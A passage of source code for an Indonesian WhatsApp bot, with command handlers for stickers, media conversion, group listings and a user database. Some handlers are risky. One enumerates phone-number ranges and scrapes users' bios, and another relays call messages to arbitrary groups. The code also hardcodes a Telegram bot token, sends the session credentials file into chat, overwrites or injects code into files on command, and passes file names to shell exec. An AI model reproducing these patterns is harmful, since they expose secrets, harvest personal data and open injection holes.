let media = await downloadContentFromMessage(quotedType, type == "imageMessage" ? "image" : "video")
let buffer = Buffer.from([])
for await (const chunk of media) {
buffer = Buffer.concat([buffer, chunk])
}
if (/video/.test(type)) {
await alice.sendMessage(m.chat, { video: buffer, caption: quotedType.caption })
} else if (/image/.test(type)) {
await alice.sendMessage(m.chat, { image: buffer, caption: quotedType.caption })
}
}
break
case 'toonce': case 'toviewonce': { 
if (!quoted) return reply(`Reply Image/Video`)
if (/image/.test(mime)) {
anuan = await alice.downloadAndSaveMediaMessage(quoted)
alice.sendMessage(m.chat, {image: {url:anuan}, caption: `Here you go!`, fileLength: "999", viewOnce : true},{quoted: m })
} else if (/video/.test(mime)) {
anuanuan = await alice.downloadAndSaveMediaMessage(quoted)
alice.sendMessage(m.chat, {video: {url:anuanuan}, caption: `Here you go!`, fileLength: "99999999", viewOnce : true},{quoted: m })
}
}
break


























































// FITUR TOOLS
case 'getid':
if (!isOwner) return reply(mess.owner)
if (!q.split('-')[0]) return reply('link tidak ada!!')
if (!isUrl(q.split('-')[0])) return reply("Harus berupa link");
let idos = await getId(q.split('-')[0], `${q.split('-')[1]}`)
reply(idos)
console.log(idos)
break;
case 'setthumb': {
if (!isCreator&&!isPremium) return reply(mess.prem)
if (!/image/.test(mime)) throw `reply gambar dengan command ${prefix + command}`
if (!quoted) throw `kau bodoh? kirim gambarnya!`
let mediya = await alice.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anuh = await TelegraPh(mediya)
global.tamnel = `${util.format(anuh)}`
reply('sudah (⁠╥⁠﹏⁠╥⁠)')
} else if (!/image/.test(mime)) {
let anuh = await TelegraPh(mediya)
global.tamnel = `${util.format(anuh)}`
reply('sudah (⁠╥⁠﹏⁠╥⁠)')
}
await fs.unlinkSync(mediya)
}
break
case 'disk':
let cp = require ('child_process')
let { promisify } = require ('util')
let eksek = promisify(cp.exec).bind(cp)
alice.sendMessage(m.chat, { react: { text: '⚙️', key: m.key }})
    let o
    try {
        o = await eksek('cd && du -h --max-depth=1')
    } catch (e) {
        o = e
    } finally {
        let { stdout, stderr } = o
        if (stdout.trim())
        reply(stdout)
        if (stderr.trim()) reply795('*I N F O   R U A N G*'+stderr)
    }
break
case 'caripesan':
if(!q) return reply('pesannya apa bang?')
const stringSimilarity = require("string-similarity");
let s = Object.values(alice.chats[m.chat].messages)
let el = s.filter(v => v.message)
let al = el.filter(v => v.message.conversation !== undefined )
let mem = []
await al.map( i => mem.push(i.message.conversation) )
let matches = await stringSimilarity.findBestMatch(q, mem) 
let ah = matches.ratings.filter(v => v.rating !== 0)

let mom = []
await ah.map( i => mom.push(i.target) )
let lala = matches.bestMatch.target
el.shift()
try {
//if(el[0].message.conversation == undefined) return
m.reply(`Ditemukan ${mom.length} pesan`)
await delay(3000)
for(let i of al) {
if(mom.includes(i.message.conversation)){
await delay(3000)
await alice.sendMessage(m.chat,{text:'Nih pesannya'},{quoted:i})
}
}
} catch(e){
console.log(e)
m.reply('Pesan tidak ditemukan!')
}
break
case 'getsession':
if (!isCreator) return reply('khusus pengguna bot')
reply('Tunggu Sebentar, Sedang mengambil file sesi mu')
let sesi = await fs.readFileSync(`./system/${global.sessionName}/creds.json`)
alice.sendMessage(m.chat, { document: sesi, mimetype: 'application/json', fileName: 'creds.json' })
break
case 'shortlink':
if (!text) return reply('*[ Wrong! ]* harap masukan link/url')
let shortUrl1 = await (await fetch(`https://tinyurl.com/api-create.php?url=${args[0]}`)).text();
if (!shortUrl1) throw `*Error: Could not generate a short URL.*`;
let done = `*[ S U C C E S S   P R O C E S S]*\n\n*Original Link :*\n${text}\n*Shortened :*\n${shortUrl1}`.trim();
replyURL(done);
break
case "adduserdb":{
if (!isCreator) return
if (!froms) return m.reply('Mention or Reply chat target.')
if (global.db.users[froms] !== undefined) return m.reply('User telah terdaftar di database!')
global.db.users[froms] = {
register: true,
name: '-',
serial: crypto.randomBytes(10).toString('hex'),
date: tanggal,
limit: 10,
owner: false,
premium: false,
banned: false
}
var jeje = `@${froms.split('@')[0]} Telah Terdaftar Ke Database Bot\nSekarang anda Bisa melihatnya di *.listdbuser*`
await reply795(jeje)
} 
break
case 'adduserdbgc':{
if (!isCreator) return
if (m.isGroup) {
const user = participants.map(v => v.id)
for (let u of user) {
if (db.users[u] == undefined) {
db.users[u] = {
name: '',
serial: crypto.randomBytes(10).toString('hex'),
date: tanggal,
limit: 10,
owner: false,
premium: false,
banned: false
}
}
}
let teks_adduser = `Sukses menambahkan ${user.length} kedalam database!`
await alice.sendteks(m.chat, teks_adduser, fpayment2)
} else if (text) {
if (!text.endsWith('@g.us')) return m.reply('Masukkan id grup dengan benar!')
try {
let meta = await alice.groupMetadata(text).catch(_ => {})
let user = meta.participants.map(v => v.id)
for (let u of user) {
if (db.users[u] == undefined) {
db.users[u] = {
name: '',
serial: crypto.randomBytes(10).toString('hex'),
date: tanggal,
limit: 10,
owner: false,
premium: false,
banned: false
}
}
}
let teks_adduser = `Sukses menambahkan ${user.length} user kedalam database!`
await alice.sendteks(m.chat, teks_adduser, fkontak2)
} catch (err) {
reply(util.format(err))
}
} else reply(`Masukkan id grup!\nContoh: ${prefix+command} 6288239620884-1626256984@g.us`)
}
break
case'limit': case'ceklimit':

break
case 'listdbuser':
if (!isCreator) return reply(mess.owner)
let listdbuser = Object.entries(db.users).map(([key, value]) => {return {...value, jid: key}})
let sortedbalance1 = listdbuser.map(toNumber('limit')).sort(sort('limit'))
let usersbalance1 = sortedbalance1.map(enumGetKey)
ppo = `Kamu Top *${usersbalance1.indexOf(sender) + 1}* Limit dari *${usersbalance1.length}* global user

${sortedbalance1.slice(0, 10).map(({ jid, balance }, i) => `${i + 1}. @${jid.split('@')[0]} => ${formatNumber(limit)}`).join`\n`}`
reply795(ppo)
break
case 'topsaldo':
let topsaldo = Object.entries(db_saldo).map(([key, value]) => {return {...value, jid: key}})
let sortedsaldo = topsaldo.map(toNumber('saldo')).sort(sort('saldo'))
let usersaldo = sortedsaldo.map(enumGetKey)
ppo = `Kamu Top *${usersaldo.indexOf(m.sender) + 1}* saldo dari *${usersaldo.length}* global user

${sortedsaldo.slice(0, 10).map(({ jid, saldo }, i) => `*${i + 1}.* @${jid.split('@')[0]} => ${formatNumber(saldo)}`).join`\n`}`
reply795(ppo)
break
case "deluserdb":{
if (!isCreator) return
if (!froms) return m.reply('Mention or Reply chat target.')
delete db.users[froms]
peeee = `Berhasil Menghapus @${froms.split('@')[0]} Dari Database User`
reply795(peeee)
}
break
case 'npms': case 'npmsearch': {
	if (!text) throw 'Input Query'
	let res = await fetch(`http://registry.npmjs.com/-/v1/search?text=${text}`)
	alice.sendMessage(m.chat, {
		react: {
			text: '⚙️',
			key: m.key,
		}
	})
	let { objects } = await res.json()
	if (!objects.length) return reply(`Query "${text}" not found :/`)
	let txt = objects.map(({ package: pkg }) => {
		return `*${pkg.name}* (v${pkg.version})\n_${pkg.links.npm}_\n_${pkg.description}_`
	}).join`\n\n`
	reply795(`乂 *N P M  S E A R C H*\n\n` + txt)
}
break
case 'getcontact': case 'getcon': {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !isOwner && !isCreator) return reply(mess.admin)
konstak = await alice.sendMessage(m.chat, {
    text: `Group : *${groupMetadata.subject}*\nMember : *${participants.length}*`
}, {quoted: m, ephemeralExpiration: 86400})
alice.sendContact(m.chat, participants.map(a => a.id), konstak)
}
break
case 'shutdown':
if (!isCreator && !isOwner) return reply(mess.owner)
reply(`Alice dimatikan`)
await loading()
process.exit()
break
case 'enc': case 'encrypt': case 'obfuscate':
{
if (!q) return reply(`Contoh ${prefix+command} const time = require('money')`)
let meg = await obfus(q)
reply795(`${meg.result}`)
}
break
case 'addowner':
if (!isCreator) return reply(mess.owner)
if (m.quoted || q) {
if (db.users[froms] == undefined) return reply795('User tidak terdaftar didalam database!')
if (db.users[froms].owner) return reply795('Udah owner!')
db.users[froms].owner = true
db.users[froms].balance += 500
reply(`*${db.users[froms].name}* Sekarang bisa mengakses fitur creator`)
reply(`Berhasil add owner *${db.users[froms].name}*`)
} else reply795('Tag atau reply pesan target!')
break
case 'delowner':
if (!isCreator) return
if (m.quoted || q) {
if (db.users[froms] == undefined) return reply795('User tidak terdaftar didalam database!')
if (!db.users[froms].owner) return reply('Belom owner!')
db.users[froms].owner = false
reply(`Berhasil menghapus *${db.users[froms].name}* dari daftar owner`)
} else reply('Tag atau reply pesan target!')
break
case 'listowner': 
let uowner = Object.entries(db.users).filter(uowner => uowner[1].owner).map(([key, value]) => {return { ...value, jid: key }})
let sortedowner = uowner.map(toNumber('owner')).sort(sort('owner'))
reply795(`*LIST USER OWNER*\nTotal : *${uowner.length}*
${sortedowner.map(({ jid, name }, i) => `\n*▸ ID:* @${jid.split('@')[0]}\n*▸ Name:* ${name}`).join`\n`}`.trim())
break
case 'nomor-wa': case 'nowa': {
if (!args[0]) return reply(`Kirim perintah ${prefix+command} <nomer>`)
var noteks = args[0]
if (!noteks.includes('x')) return reply('lah?')
function countInstances(string, word) {
return string.split(word).length - 1;
}
var nomer0 = noteks.split('x')[0]
var nomer1 = noteks.split('x')[countInstances(noteks, 'x')] ? noteks.split('x')[countInstances(noteks, 'x')] : ''
var random_length = countInstances(noteks, 'x')
var random;
if (random_length == 1) {
random = 10
} else if (random_length == 2) {
random = 100
} else if (random_length == 3) {
random = 1000
}
var nomerny = `LIST NOMOR WHATSAPP\n\nPunya Bio/status/info\n`
var no_bio = `\nTanpa Bio/status/info || \nHey there! I am using WhatsApp.\n`
var no_watsap = `\nTidak Terdaftar\n`
for (let i = 0; i < random; i++) {
var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
var dom1 = nu[Math.floor(Math.random() * nu.length)]
var dom2 = nu[Math.floor(Math.random() * nu.length)]
var dom3 = nu[Math.floor(Math.random() * nu.length)]
var dom4 = nu[Math.floor(Math.random() * nu.length)]
var rndm;
if (random_length == 1) {
rndm = `${dom1}`
} else if (random_length == 2) {
rndm = `${dom1}${dom2}`
} else if (random_length == 3) {
rndm = `${dom1}${dom2}${dom3}`
} else if (random_length == 4) {
rndm = `${dom1}${dom2}${dom3}${dom4}`
}
var xanu = await alice.onWhatsApp(`${nomer0}${i}${nomer1}@s.whatsapp.net`);
var xanuu = xanu.length !== 0 ? xanu : false
try {
try {
var xanu1 = await alice.fetchStatus(xanu[0].jid)
} catch {
var xanu1 = '401'
}
if (xanu1 == '401' || xanu1.status.length == 0) {
no_bio += `wa.me/${xanu[0].jid.split("@")[0]}\n`
} else {
nomerny += `wa.me/${xanu[0].jid.split("@")[0]}\nBiography : ${xanu1.status}\nDate : ${moment(xanu1.setAt).tz('Asia/Jakarta').format('HH:mm:ss DD/MM/YYYY')}\n\n`
}
} catch {
no_watsap += `${nomer0}${i}${nomer1}\n`
}
}
reply(`${nomerny}${no_bio}${no_watsap}`)
}
break
case 'buatgc': 
case 'creategc':
case 'creategroup': {
if (!isCreator && !isOwner && !isPremium) return reply('Khusus Sepuh (っ˘̩╭╮˘̩)っ')
if (!args.join(" ")) return reply(`Use ${prefix+command} groupname`)
try {
let cret = await alice.groupCreate(args.join(" "), [])
let response = await alice.groupInviteCode(cret.id)
let teks2 = `      [ ${cret.subject} ]

▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}
▸ Group Id : ${cret.id}
▸ Join : chat.whatsapp.com/${response}`
replyURL(teks2)
} catch {
reply("Error!")
}
}
break
case 'delfolder':
if (!isCreator) return reply(global.mess.owner)
if (!text) return reply795(`*• Example* : ${prefix + command} userclone/session`)
rimraf.sync(`./${text}`)
reply(`Berhasil hapus folder ${q}`)
break
case 'gfl': case "gantifile":{
if (!isCreator) return reply(global.mess.owner)
if (!text.includes("./")) return reply795(`*• Example* : ${prefix + command} ./package.json`)
let files = fs.readdirSync(text.split(m.quoted.fileName)[0])
if (!files.includes(m.quoted.fileName)) return reply("File not found") 
let media = await downloadContentFromMessage(m.quoted, "document")
let buffer = Buffer.from([])
for await(const chunk of media) {
buffer = Buffer.concat([buffer, chunk])
}
fs.writeFileSync(text, buffer)
reply(`Mengupload`)
await delay(2000)
reply(`Berhasil mengganti file ${q}`)
}
break
case 'restart':
if (!isCreator) return reply(global.mess.owner)
let restar = '*[ Notice ]* bot sedang dalam proses restart, harap untuk tidak mengirim perintah saat proses restart di lakukan, alice akan segera aktif kembali!'
alice.sendMessage(global.idgcs, {
image: {url: global.tamnel},caption: restar, contextInfo: { forwardingScore: 0,isForwarded: true,businessMessageForwardInfo: {
businessOwnerJid:botNumber }}})
await sleep(3000)
await loading()
process.exit()
break

case 'telegram':
if (!text) return reply('masukan tag/username telegram anda')
const token = '6512411455:AAGEVs_xNptRn4KaiFTaWKOjwmdFx4DEmpc';
const chatId = text;
const message = 'Hello from your Telegram bot!';

const apiUrl = `https://api.telegram.org/bot${token}/sendMessage`;

fetch(apiUrl, {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
  },
  body: JSON.stringify({
    chat_id: chatId,
    text: message,
  }),
})
break
case 'cekgc': {
if (!isCreator && !isOwner && !isPremium)
if (!args[0]) return reply("Linknya?")
let linkRegex = args.join(" ")
let coded = linkRegex.split("https://chat.whatsapp.com/")[1]
if (!coded) return reply("Link Invalid")
alice.query({
tag: "iq",
attrs: {
type: "get",
xmlns: "w:g2",
to: "@g.us"
},
content: [{ tag: "invite", attrs: { code: coded } }]
}).then(async(res) => { 
tekse = `「 Group Link Yang Di Inspect 」

▸ Nama Group : ${res.content[0].attrs.subject ? res.content[0].attrs.subject : "undefined"}
▸ ID Group : ${res.content[0].attrs.id ? res.content[0].attrs.id : "undefined"}@g.us
▸ Deskripsi Di Ubah : ${res.content[0].attrs.s_t ? moment(res.content[0].attrs.s_t *1000).tz("Asia/Jakarta").format("DD-MM-YYYY, HH:mm:ss") : "undefined"}
▸ Pembuat Group : ${res.content[0].attrs.creator ? "@" + res.content[0].attrs.creator.split("@")[0] : "undefined"}
▸ Group Di Buat : ${res.content[0].attrs.creation ? moment(res.content[0].attrs.creation * 1000).tz("Asia/Jakarta").format("DD-MM-YYYY, HH:mm:ss") : "undefined"}
▸ Total Member : ${res.content[0].attrs.size ? res.content[0].attrs.size : "undefined"} Member

© ${global.fake}`
try {
pp = await alice.profilePictureUrl(res.content[0].attrs.id + "@g.us", "image")
} catch {
pp = "https://tse2.mm.bing.net/th?id=OIP.n1C1oxOvYLLyDIavrBFoNQHaHa&pid=Api&P=0&w=153&h=153"
}
alice.sendFile(from, pp, "", m, { caption: tekse })
})
}
break
case 'listpc': {
if (!isCreator && !isOwner && !isPremium) return reply(mess.owner)
let anulistp = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
let teks = `*PERSONAL CHAT LIST*\n\nTotal Chat : ${anulistp.length} Chat\n\n`
for (let i of anulistp) {
let nama = store.messages[i].array[0].pushName
teks += `*Name :* ${nama}\n*User :* @${i.split('@')[0]}\n*Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
}
alice.sendteks(m.chat, teks, m)
}
break
case 'getdb':
if (!isCreator && !isOwner) return reply('khusus dalwin ( ◜‿◝ )♡')
alice.sendMessage(from, {document: fs.readFileSync('./database/user.db.json'), caption: 'Database Bot', mimetype: 'application/json', fileName: 'database.json' }, {quoted: m})
break
case 'warcallid': {
if (!isCreator && !isOwner && !isPremium) return reply(mess.owner)
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} Contoh : ${prefix+command} ID group|Awikawok`)
if (!q) return reply(`Contoh penggunaan 123xxxxx@g.us|Pesannya`)
let nummess = q.replace(/[^0-9]/g, '')+'@g.us'
let ppp = q.split('|')[1]
var call = { 
scheduledCallCreationMessage: {
callType: 2,
scheduledTimestampMs:  Date.now(),
title: ppp,
}}
alice.relayMessage(nummess, call, {})
await delay(10)
alice.sendMessage(from, {text: `Sukses kirim pesan ke ${nummess} tuan!`}, {quoted: m})
}
break
case 'listgc': {
if (!isCreator && !isOwner) return reply(mess.owner)
let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
let tekslistgc = `乂 *L I S T  G R O U P  C H A T*\n\n`
tekslistgc += `  ◦  Total Group : ${anu.length} Group\n`
for (let e of anu) {
let metadata = await alice.groupMetadata(e)
tekslistgc += `╭ *Nama :* ${metadata.subject}\n`
tekslistgc += `│ *Owner Grup :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Tidak diketahui'}\n`
tekslistgc += `│ *ID :* ${metadata.id}\n`
tekslistgc += `│ *Dibuat :* ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n`
tekslistgc += `╰  *Member :* ${metadata.participants.length}\n\n`
tekslistgc += `──────────────────────\n\n`
}
reply795(tekslistgc)
            }
        break
case "opsichatpc":
if (!isCreator) return reply('khusus owner (´-﹏-`；)')
let titlenya = `PLEASE SELECT`
chat33 = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
if (args[0] == "pin") {
await alice.chatModify({ pin: true }, chat33)
} else if (args[0] == "unpin") {
await alice.chatModify({ pin: false }, chat33)
} else if (args[0] == "archive") {
await alice.chatModify({ archive: true, lastMessages: [m] }, chat33)
} else if (args[0] == "unarchive") {
await alice.chatModify({ archive: false, lastMessages: [m] }, chat33)
} else if (args[0] === "mute") {
await alice.chatModify({ mute: "Infinity" }, chat33, [])
} else if (args[0] === "unmute") {
await alice.chatModify({ mute: null }, chat33, [])
} else if (args[0] === "read") {
await alice.chatModify({ markRead: true, lastMessages: [m] }, chat33)
} else if (args[0] === "unread") {
await alice.chatModify({ markRead: false, lastMessages: [m] }, chat33)
} else if (args[0] == "block") {
await alice.updateBlockStatus(chat33, 'block')
} else if (args[0] == "unblock") {
await alice.updateBlockStatus(chat33, 'unblock')
} else if (args[0] == "delete") {
await alice.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp.low }]}, chat33).catch((err) => reply(`Berhasil Delete Chat`))
} else {
alice.sendPoll(m.sender, titlenya, [`${command} pin ${chat33}`,`${command} unpin ${chat33}`,`${command} archive ${chat33}`,`${command} unarchive ${chat33}`,`${command} mute ${chat33}`,`${command} unmute ${chat33}`,`${command} read ${chat33}`,`${command} unread ${chat33}`,`${command} block ${chat33}`,`${command} unblock ${chat33}`,`${command} delete ${chat33}`])
}
break

case 'welcome':
if (!isCreator&&!isPremium) return reply(mess.prem)
if (args[0] == 'on'){
if (global.welcome) return reply('di aktifkan sebelumnya!')
global.welcome = true
reply('Fitur welcome telah di aktifkan')
} else if (args[0] == 'off'){
if (!global.welcome) return reply('sudah mati sebelumnya!')
global.welcome = false
reply('Fitur welcome telah di matikan')
} else reply('on / off')
break
case 'getcase':
if (!isCreator&&!isOwner) return reply(mess.owner)
if (!q) return reply795(`Contoh penggunaan: ${prefix+command} menu`)
const getcase = (cases) => {
return "case "+`'${cases}'`+fs.readFileSync('./alice.js').toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"
}
reply795(`${getcase(q)}`)
break
case 'getfunc':
if (!isCreator&&!isOwner) return reply(mess.owner)
if (!q) return reply795(`Contoh penggunaan: ${prefix+command} reply`)
const getfunc = (funcc) => {
return "const "+`'${funcc}'`+fs.readFileSync('./alice.js').toString().split('const \''+funcc+'\'')[1].split('')
}
reply795(`${getfunc(q)}`)
break

case 'addcase': {
                if (!isCreator) return reply('buat owner dibilang')
    if (!text) return reply('Mana case nya');
    const fs = require('fs');

// Nama file yang akan dimodifikasi
const namaFile = './alice.js';

// Kode case baru yang ingin Anda tambahkan
const caseBaru = `${text}`;

// Baca isi file
fs.readFile(namaFile, 'utf8', (err, data) => {
    if (err) {
        console.error('Terjadi kesalahan saat membaca file:', err);
        return;
    }

    // Cari posisi awal dari kumpulan case 'gimage'
    const posisiAwalGimage = data.indexOf("case 'addcase':");

    if (posisiAwalGimage !== -1) {
        // Tambahkan case baru tepat di atas case 'gimage'
        const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);

        // Tulis kembali file dengan case baru
        fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
            if (err) {
                reply('Terjadi kesalahan saat menulis file:', err);
            } else {
                reply('Case baru berhasil ditambahkan di atas case gimage.');
            }
        });
    } else {
        reply('Tidak dapat menemukan case gimage dalam file.');
    }
});

}
break;
case 'delcase': {
function delCase(filePath, caseName) {
    try {
        let code = fs.readFileSync(filePath, 'utf8');
        const caseIndex = code.indexOf(`case '${caseName}':`);

        if (caseIndex !== -1) {
            let startIndex = code.lastIndexOf('case', caseIndex);
            let endIndex = code.indexOf('break', caseIndex);
            let afterBreakIndex = code.indexOf(';', endIndex);

            if (afterBreakIndex !== -1) {
                afterBreakIndex += 1; // Tambahkan satu karakter untuk memasukkan titik koma
            } else {
                afterBreakIndex = endIndex + 5; // Tambahkan panjang dari "break" tanpa titik koma
            }

            let before = code.slice(0, startIndex);
            let after = code.slice(afterBreakIndex);
            let newCode = before + after;

            fs.writeFileSync(filePath, newCode, 'utf8');
            return true;
        } else {
            console.error(`Tidak dapat menemukan case dengan nama '${caseName}'.`);
            return false;
        }
    } catch (error) {
        console.error(error);
        return false;
    }
}

           if (!isCreator) {
           return
           }
          if(!text) return reply(`masukkan nama case`)
       let data = await delCase('alice.js', text)
       if(data) {
           reply(`Berhasil menghapus case ${text}`)
           } else {
               reply(`${data}`)
               }
               }
break
case 'gimage': {
if (!text) return reply(`Example : ${prefix + command} carry minati`)
reply(mess.wait)
let gis = require('g-i-s')
gis(text, async (error, result) => {
n = result
images = n[Math.floor(Math.random() * n.length)].url
alice.sendMessage(m.chat, { image: { url: images}, caption: `*Query* : ${text}\n*Media Url* : ${images}`}, { quoted: m })
})
}
break

//==================================================================
            
             
             

             







































// FITUR CONVERTER
case 'avatar': case 'smeta': {
async function addExifAvatar(buffer, packname, author, categories = [''], extra = {}) {
  const {
    default: {
      Image
    }
  } = await import('node-webpmux')
  const img = new Image()
  const json = {
    'sticker-pack-id': 'Darwin Pragmatic',
    'sticker-pack-name': 'Alice Zuberg',
    'sticker-pack-publisher': 'Project Alicezation',
    'emojis': categories,
    'is-avatar-sticker': 1,
    ...extra
  }
  let exifAttr = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00])
  let jsonBuffer = Buffer.from(JSON.stringify(json), 'utf8')
  let exif = Buffer.concat([exifAttr, jsonBuffer])
  exif.writeUIntLE(jsonBuffer.length, 14, 4)
  await img.load(buffer)
  img.exif = exif
  return await img.save(null)
}
function makeid(length) {
  let result = '';
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  const charactersLength = characters.length;
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return result;
}
  var stiker = false
  try {
    let [packname, ...author] = q.split('|')
    if (!/webp/.test(mime)) return reply('Reply sticker!')
    //let img = await q.download()
    let img = await alice.downloadAndSaveMediaMessage(quoted, makeid(5))
    if (!img) return reply('Reply a sticker!')
    var stiker = await addExifAvatar(img, `${global.packname}`, `${global.author}`)
  } catch (e) {
    console.error(e)
    if (Buffer.isBuffer(e)) stiker = e
  } finally {
    if (stiker) alice.sendMessage(m.chat, {
      sticker: stiker
    }, {
      quoted: floc
    })
    else throw 'Conversion failed'
  }
}
break
case 'swm': case 'steal': case 'stickerwm': case 'take':{
if (!args.join(" ")) return reply(`Where is the text?`)
const swn = args.join(" ")
const pcknm = swn.split("|")[0];
const atnm = swn.split("|")[1];
if (m.quoted.isAnimated === true) {
alice.downloadAndSaveMediaMessage(quoted, "gifee")
alice.sendMessage(from, {sticker:fs.readFileSync("gifee.webp")},{quoted:m})
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await alice.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Maximum 10 Seconds!')
let media = await quoted.download()
let encmedia = await alice.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
await fs.unlinkSync(encmedia)
} else {
reply(`Photo/Video?`)
}
}
break
case 'toptv':{
if (!m.quoted) return reply('```Reply Videonya Untuk Di Jadikan Ptv [!]```')
if (!isVideo || !isQuotedVideo) {
const toptvv = {key: {fromMe: true, participant: `6283897387848@s.whatsapp.net`, ...(from ? {remoteJid: "status@broadcast"} : {})}, message: {extendedTextMessage: {text: `Powered By Alice`}}}
var ppt = m.quoted
var ptv = generateWAMessageFromContent(from, proto.Message.fromObject({"ptvMessage": ppt, caption: `done banh`, fileLength: 9999999999 }), { userJid: from})
alice.relayMessage(from, ptv.message, { messageId: ptv.key.id })
}
}
break
case 'toimage': case 'toimg': {
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
let media = await alice.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
alice.sendMessage(from, { image: buffer }, {quoted:m})
fs.unlinkSync(ran)
})
}
break
case 'remini':
case 'hd':
case 'jadihd':{
if (!m.quoted) return reply795(`Reply gambar ${prefix}${command}`)
const { remini } = require('./lib/remini')
let media = await quoted.download()
let proses = await remini(media, "enhance");
alice.sendMessage(m.chat, { image: proses, caption:"Nihh Gambarnya jadi HD"}, { quoted: m})
}
break
case 'say': case "tts": case "gtts":{
if (!q) return reply('Masukan Text!\n. contoh: tts jawa hitam')
const gtts = require("./lib/gtts")(`ja`, `${q}`)
var bby = args.join(' ')
let ranm = getRandom('.mp3')
let rano = getRandom('.ogg')
bby.length > 500 ? reply('Teks nya terlalu panjang !')
: gtts.save(ranm, bby, function () {
exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
fs.unlinkSync(ranm)
let buff = fs.readFileSync(rano)
if (err) return reply('Error Njir')
alice.sendMessage(from, { audio: buff, mimetype: "audio/mp4", ptt: true },{ quoted: m })
fs.unlinkSync(rano)
})
})
}
break
case 'smeme':
var atas = text.includes('-') ? text.split('-')[0] ? text.split('-')[0] : text : '-'
var bawah = text.includes('-') ? text.split('-')[1] ? text.split('-')[1] : '' : text
if (!text) return reply(`Gunakan dengan cara ${prefix+command} *text atas-text bawah*\n• example : ${prefix+command} Alice-Bot`)
if (text.length > 30) return reply(`Teksnya kebanyakan! kalo make ngotak dikit kontol!`)
if (/image/.test(mime)) {
reply(global.mess.wait)
var media = await alice.downloadAndSaveMediaMessage(quoted, Date.now())
var media_url = await global.telegraPH(media)
var meme_url = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${media_url}`
alice.sendImageAsSticker(from, meme_url, fpayment2, {packname: '© 𝙰𝚄𝚃𝙷𝙾𝚁 𝙹𝙾𝙼𝙾𝙺', author: '𝙳𝙰𝚁𝚆𝙸𝙽 𝙱𝙾𝚃'})
await fs.unlinkSync(media)
} else reply(`kirim gambar untuk di konversi ke *${command}*\n\ncara penggunaan *${command}* adalah dengan reply/balas gambar yang ingin di konversi\n\nexample : ${command} textAtasnya-textBawahnya\ngunakan tanda strip *( - )* guna pemisah/spit`);
break
case 'jadianime':
if (!isCreator && !isOwner && !isPremium) return reply(mess.owner)
if (!isGroup) return onlyGroup()
if (isImage && !isQuotedImage) return reply(`Kirim gambar lalu reply ${prefix + command} atau tag gambar yang sudah dikirim`)
reply(mess.wait)
try {
        const quotedMsg = await alice.downloadAndSaveMediaMessage(quoted)
        const media = await alice.downloadAndSaveMediaMessage(quoted)
        const buffer = Buffer.from(media.data, 'base64');
        const cloud = await uploader(buffer)        
        const anime = await fetch(BASE_URL + `/toanime` + `?url=${cloud}`).then(response => response.json());
        console.log(chalk.bgGreen.black(`> ${anime.url.img_crop_single}`));
        const imgs = await fetch(anime.url.img_crop_single).then(res => res.buffer())
        const response = new MessageMedia((await fromBuffer(imgs)).mime, imgs.toString("base64"))
        await client.sendMessage(message.from, response, { caption: `✔️ Done`, quotedMessage: message.id._serialized });               
    } catch (e) {
      console.log(e);
    }
break
case  'qc':{
let teks = m.quoted && m.quoted.q ? m.quoted.text : q ? q : "";
if (!teks) return reply(`Cara Penggunaan ${prefix}qc teks`)
const text = `${teks}`
const avatar = await alice.profilePictureUrl( m.quoted ? m.quoted.sender : m.sender,"image").catch(() =>`https://i0.wp.com/telegra.ph/file/134ccbbd0dfc434a910ab.png`)
const json = {
type: "quote",
format: "png",
backgroundColor: "#FFFFFF",
width: 800,
height: 580,
scale: 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": pushname,
"photo": {
"url": avatar
}
},
"text": text,
"replyMessage": {}
}
 ],
};
axios
.post(
"https://bot.lyo.su/quote/generate",
json,
{
headers: { "Content-Type": "application/json" },
})
.then(async (res) => {
const buffer = Buffer.from(res.data.result.image, "base64");
let encmedia = await alice.imgToSticker(m.chat, buffer, m, { packname: global.packname, 
author: global.namaownernya, 
categories: ['🤩', '🎉'],
id: '12345',
quality: 100,
background: 'transparent'})
await fs.unlinkSync(encmedia)
})
}
break 
case  'qcimg':{
let teks = m.quoted && m.quoted.q ? m.quoted.text : q ? q : "";
